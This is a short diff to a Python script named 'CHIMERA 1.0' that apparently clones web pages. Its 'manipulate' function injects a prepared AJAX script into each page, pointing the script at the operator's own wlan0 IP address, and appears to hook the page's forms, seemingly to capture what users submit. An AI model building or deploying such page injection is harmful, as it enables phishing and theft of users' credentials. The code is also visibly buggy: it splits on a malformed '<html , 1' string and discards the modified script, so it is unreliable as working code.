@@ -13,7 +13,10 @@ def manipulate(source , cur_url):
 		xml_line = modify_xml[1].split(">")[0]
 		source = source.replace(xml_line , "php echo " + chr(39) + "<?" + xml_line + ">" + chr(39) + ";?") 
         AJAX_readymade = open("AJAX_script" , "r")
-        adding_AJAX = source.split("<html")
+	AJAX_fixed = AJAX_readymade.read()
+	ad = "http://" + str(netifaces.ifaddresses("wlan0").get(netifaces.AF_INET)[0]['addr'])
+	AJAX_fixed = AJAX_fixed.replace("HERE" , ad)
+        adding_AJAX = source.split("<html , 1")
         source = adding_AJAX[0] + AJAX_readymade.read() + "<html" + adding_AJAX[1] + "/html>"
         adding_onsubmit = source.split("<form")
         source = adding_onsubmit[0] + "<form"
@@ -40,6 +43,7 @@ def manipulate(source , cur_url):
 	return source
 import os
 import requests
+import netifaces
 print "              -----Welcome to CHIMERA 1.0-----"
 file_ready = "n"
 while not file_ready == "y":
